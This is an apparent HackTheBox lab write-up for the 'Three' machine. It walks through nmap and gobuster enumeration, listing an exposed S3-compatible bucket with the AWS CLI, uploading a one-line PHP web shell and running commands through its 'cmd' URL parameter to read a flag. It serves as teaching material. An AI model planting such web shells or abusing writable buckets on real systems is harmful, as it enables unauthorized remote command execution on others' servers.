# Three – Writeup (Easy)

**Machine:** Three  
**Difficulty:** Easy  
**Tech Used:** Nmap, Gobuster, AWS CLI, S3, PHP  
**Objective:** Demonstrate network enumeration, web enumeration, virtual host discovery, S3 bucket enumeration, file upload, and remote command execution.

**By:** Ce'Bria Haynes | **Published:** 9/21/2026

---

## Overview

Three is an easy-level HackTheBox machine focused on web enumeration, virtual host discovery, and exploiting an improperly configured S3-compatible storage service. The machine demonstrates how exposed storage infrastructure and insecure file permissions can allow an attacker to upload files and eventually execute commands on the underlying server.

I began by performing a full TCP port scan using Nmap. The scan identified two open ports: SSH on port 22 and HTTP on port 80. Since the web server was directly accessible, I focused my initial enumeration on the HTTP service.

Navigating to the website on port 80 revealed a website for a band called **The Toppers**. While browsing the website, I noticed an option to purchase tickets, although the functionality did not appear to work. There was also a section that allowed fans to leave notes for the band.

After attempting to submit a note, I was redirected to a "Not Found" page. Although the functionality itself did not provide an obvious entry point, the page exposed an email address:

```text
mail@thetoppers.htb
```

The email address revealed the domain `thetoppers.htb`. I added this domain to my /etc/hosts file so that I could access the virtual host properly.

I then performed virtual host enumeration using Gobuster. This identified an additional subdomain called `s3.thetoppers.htb`. The name of the subdomain suggested that it could be an S3-compatible storage service.

After adding `s3.thetoppers.htb` to /etc/hosts, I used the AWS CLI to interact with the storage service. I was able to enumerate the available buckets and discovered a bucket named `thetoppers.htb`.

Listing the contents of the bucket revealed an index.php file. This indicated that the bucket was being used to store files associated with the website.

I then tested whether I could upload a file to the bucket. I created a simple PHP web shell and uploaded it to the bucket using the AWS CLI. Because the bucket was connected to the web application, I was able to access the uploaded PHP file through the main website.

The web shell allowed me to execute system commands remotely by editing the URL. After running `ls`, I discovered a file named flag.txt. I then used `cat` against the file and retrieve the flag.

## Enumeration
### Nmap Scan

I started with a full TCP port scan using Nmap with service detection and default scripts:

```bash
nmap -sC -sV -p- 10.129.148.39 -oA three_scan
```

<img width="610" height="250" alt="nmap" src="https://github.com/user-attachments/assets/f1d2c933-6ef3-4d56-8205-34a2795e5b35" />

The scan identified two open ports:

```text
22/tcp    open    ssh    OpenSSH 7.6p1
80/tcp    open    http   Apache httpd 2.4.29
```

Port 22 was running SSH with OpenSSH 7.6p1, while port 80 was running an Apache HTTP server.

Since the HTTP service was directly accessible, I decided to investigate the website before attempting anything against SSH.

### Web Enumeration

I navigated to the website hosted on port 80.

<img width="959" height="414" alt="website" src="https://github.com/user-attachments/assets/d75c823d-7974-4bfc-ba08-bbe43b1bf7ad" />

The page belonged to a band called **The Toppers**. The website appeared to contain several different sections and features.

While browsing the page, I noticed an option to purchase tickets. However, the ticket functionality did not appear to work.

<img width="959" height="377" alt="buy tickets" src="https://github.com/user-attachments/assets/9a76369f-66d0-47e2-92f9-ffabeba40b3f" />

There was also a section where fans could leave notes for the band. I attempted to submit a note through this functionality.

<img width="834" height="314" alt="fan notes" src="https://github.com/user-attachments/assets/8f279302-614c-40a9-a95b-1aa2aeafbefd" />

After submitting the note, I was redirected to a "Not Found" page. Although the page did not provide an obvious way forward, the 'fan notes' section did provide
useful information.

It exposed an email address:

```text
mail@thetoppers.htb
```

This provided the domain:

```text
thetoppers.htb
```

I added the domain to my /etc/hosts file. With the domain configured locally, I could now continue enumerating the application and look for additional virtual hosts.

### Virtual Host Enumeration

I performed virtual host enumeration using Gobuster and the SecLists subdomain wordlist:

```bash
gobuster vhost -u http://10.129.148.39 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --domain thetoppers.htb
```

<img width="611" height="350" alt="gobuster enum" src="https://github.com/user-attachments/assets/3bd4424c-ef92-4980-bb24-e351ab787f4b" />

The enumeration identified two virtual hosts:

```text
s3.thetoppers.htb
gc._msdcs.thetoppers.htb
```

The s3.thetoppers.htb virtual host stood out because the s3 naming convention suggested that it could be an S3-compatible storage service.

I added the newly discovered subdomain to /etc/hosts. I then began investigating the S3 service.

### S3 Enumeration

I decided to use the AWS CLI to interact with the S3-compatible service.

After configuring the AWS CLI with the default credentials, I attempted to list the available buckets using:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls
```

<img width="479" height="36" alt="available buckets" src="https://github.com/user-attachments/assets/fc2aff84-5c2a-45e6-9531-e4d5f0280d4e" />

The command successfully returned a bucket named:

```text
thetoppers.htb
```

This indicated that I had access to enumerate the storage service.

I then listed the contents of the bucket:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

<img width="602" height="68" alt="bucket contents" src="https://github.com/user-attachments/assets/dd5baf2d-8eff-4581-a905-b52fb8751c9d" />

The bucket contained:

```text
index.php
```

The presence of index.php was significant because it suggested that the bucket was being used as the root directory for the website.

At this point, I wanted to determine whether I had write access to the bucket. If I could upload a file and have the web server execute it, this could potentially provide a way to execute commands on the target.

## Exploitation

### Creating a PHP Web Shell

I created a simple PHP file named bash.php containing:

```bash
<?php system($_GET["cmd"]); ?>
```

This script accepts a command through the `cmd` URL parameter and passes the command to the system for execution.

I then attempted to upload the file directly to the S3 bucket:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 cp bash.php s3://thetoppers.htb
```

<img width="605" height="53" alt="shell upload" src="https://github.com/user-attachments/assets/223e880f-c761-4a73-bb6a-7420ad9a213b" />

The file was successfully uploaded.

Since the S3 bucket appeared to be connected to the website hosted at thetoppers.htb, I attempted to access the uploaded file through the web server.

### Remote Command Execution

I accessed the uploaded PHP file using:

```text
http://thetoppers.htb/bash.php?cmd=<any_command>
```

The `cmd` parameter allowed me to specify a system command that would be executed by the PHP script.

I first tested the web shell by running `ls`:

```text
http://thetoppers.htb/bash.php?cmd=ls+../
```

<img width="613" height="191" alt="flag ls" src="https://github.com/user-attachments/assets/3f354754-e272-484b-a07a-1f2800e5985c" />

The response returned:

```text
flag.txt
html
```

The output showed that a file named `flag.txt` was located in the current directory.

Since the web shell was executing commands successfully, I could use `cat` to read the contents of the flag file.

I accessed:

```text
http://thetoppers.htb/bash.php?cmd=cat+../flag.txt
```

<img width="1200" height="517" alt="flag" src="https://github.com/user-attachments/assets/41c29add-99fc-4571-a289-f9504954e911" />

The command successfully returned the contents of flag.txt, revealing the flag and completing the machine.

## Conclusion

Three was an easy machine that demonstrated how web enumeration can lead to the discovery of an improperly configured S3-compatible storage service.

The initial Nmap scan identified two open ports: SSH on port 22 and HTTP on port 80. Since the HTTP service exposed a website, I focused my enumeration on the web application.

The website belonged to a band called The Toppers. While testing the site's functionality, I attempted to submit a note through the fan message section. Although the submission resulted in a "Not Found" page, the response exposed an email address using the thetoppers.htb domain.

After adding thetoppers.htb to /etc/hosts, I performed virtual host enumeration using Gobuster. This discovered the s3.thetoppers.htb subdomain, which suggested the presence of an S3-compatible storage service.

I used the AWS CLI to interact with the service and enumerate its available buckets:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls
```

This revealed the thetoppers.htb bucket. I then enumerated its contents:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

The bucket contained an index.php file, indicating that it was being used to host files for the website.

Because I was able to interact with the bucket, I tested whether I could upload my own files. I created a PHP web shell containing:

```text
<?php system($_GET["cmd"]); ?>
```

I uploaded the shell using:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 cp bash.php s3://thetoppers.htb
```

The uploaded PHP file was accessible through the website, allowing me to execute system commands remotely. Running `ls` revealed flag.txt, which I then read using `cat` to retrieve the flag.

The main techniques demonstrated by this machine were:

- Full TCP port enumeration with Nmap

- Web application enumeration

- Discovering a domain through an exposed email address

- Virtual host enumeration with Gobuster

- Identifying an S3-compatible storage service

- Enumerating S3 buckets using the AWS CLI

- Enumerating bucket contents

- Testing and exploiting write access to an S3 bucket

- Uploading a PHP web shell and achieving remote command execution

- Retrieving a flag from the target system

Overall, Three demonstrates the security risks associated with improperly configured cloud storage and web applications.
An S3 bucket that allows unauthorized users to upload files can become especially dangerous when those files are served directly by a web application and interpreted as executable code.
Proper authentication, authorization, bucket permissions, and separation between file storage and executable web content can help prevent this type of attack.

